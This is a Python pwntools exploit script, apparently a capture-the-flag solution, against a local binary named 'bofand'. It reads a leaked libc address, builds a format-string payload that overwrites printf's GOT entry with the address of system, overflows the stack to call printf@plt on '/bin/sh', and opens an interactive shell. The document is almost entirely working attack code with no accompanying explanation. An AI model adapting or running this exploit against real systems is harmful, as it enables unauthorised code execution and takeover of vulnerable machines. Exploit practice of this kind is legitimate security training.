from pwn import *
import math

binary_name = "./bofand"
remote_name = "localhost"
remote_port = 10355
libc_name = "./libc.so.6"

io = remote(remote_name, remote_port)
# io = process(binary_name)
# io = gdb.debug(binary_name, "b main\nc\n")

elf = ELF(binary_name)
libc = ELF(libc_name)


io.recvuntil(b"addr: ")
l = io.readline()[:-1]
# print(l)
base_3 = int(l, 16) - libc.symbols["fgets"] & 0xFFFFFF

# print(hex(libc.symbols["fgets"] & 0xFFFFFF))
# print(hex(base_3))

payload = b"/bin/sh #"
payload += f"%{256-len(payload)}c".encode("utf-8")
system_addr = libc.symbols["system"] + base_3
fsa_len = 0x50
arg_offset = 6
stack_arg_offset = arg_offset + fsa_len // 8
for i, x in enumerate(p64(system_addr)[:3]):
    payload += f"%{x}c%{i+stack_arg_offset}$hhn%{256-x}c".encode("utf-8")

payload += b"A" * (math.floor(len(payload) / 8) * 8 - len(payload))
# print(hex(len(payload)))

assert len(payload) < fsa_len
payload += b"B" * (fsa_len - len(payload))

for i in range(3):
    payload += p64(elf.got["printf"] + i)

# print(hex(len(payload)))
assert len(payload) < 0x80

payload += b"A" * (0x80 - len(payload))
payload += p64(elf.plt["printf"])

io.sendlineafter(b"0>", payload)

io.interactive()
io.close()
